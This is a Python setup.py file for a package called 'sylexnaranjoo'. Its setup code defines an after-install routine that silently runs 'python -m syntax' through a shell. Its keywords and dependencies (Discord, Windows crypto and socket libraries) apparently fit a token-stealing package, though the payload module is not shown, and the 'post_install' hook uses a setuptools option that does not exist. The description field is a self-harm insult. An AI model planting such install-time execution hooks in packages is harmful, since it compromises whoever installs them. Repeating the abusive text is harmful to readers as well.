import os
import sys
import subprocess
from setuptools import setup, find_packages

# Función para ejecutar comandos en la terminal
def run_command(command):
    process = subprocess.Popen(
        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    stdout, stderr = process.communicate()
    return (stdout.decode(), stderr.decode(), process.returncode)

# Función para ejecutar después de la instalación
def after_install(options, home_dir):
    # Verificar si se instaló el paquete en modo desarrollo
    develop_mode = 'develop' in sys.argv
    if develop_mode:
        print("El paquete se ha instalado en modo desarrollo.")
    else:
        # Ejecutar el comando python -m syntax
        result = run_command("python -m syntax")
        if result[2] != 0:
            print("Error al ejecutar el comando python -m syntax.")
            print(result[1])

# Configuración del paquete
setup(
    name="sylexnaranjoo",
    version="1.0.6",
    author="$yntax",
    author_email="syntaxcode07@gmail.com",
    description="Suicidate tahg",
    long_description_content_type="text/markdown",
    url="https://github.com/codeuk",
    project_urls={
        "GitHub": "https://github.com/codeuk/",
    },
    license="MIT",
    keywords=["discord"],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: Microsoft :: Windows",
        "Development Status :: 5 - Production/Stable",
        "Intended Audience :: Developers",
        "Natural Language :: English",
        "Topic :: Software Development",
    ],
    package_dir={"": "."},
    packages=find_packages(where="."),
    install_requires=['requests', 'sockets', 'pypiwin32', 'pycryptodome', 'uuid'],
    entry_points={
        "console_scripts": [
            "sylexnaranjoo=syntax.__main__:main"
        ]
    },
    # Ejecutar la función after_install después de la instalación
    options={"install": {"optimize": 1, "prefix": sys.prefix}},
    zip_safe=False,
    cmdclass={},
    # Definir la función after_install como función de post-instalación
    # solo si la variable de entorno SETUP_PY_INSTALL es 1
    post_install=[after_install] if os.environ.get("SETUP_PY_INSTALL") == "1" else [],
)
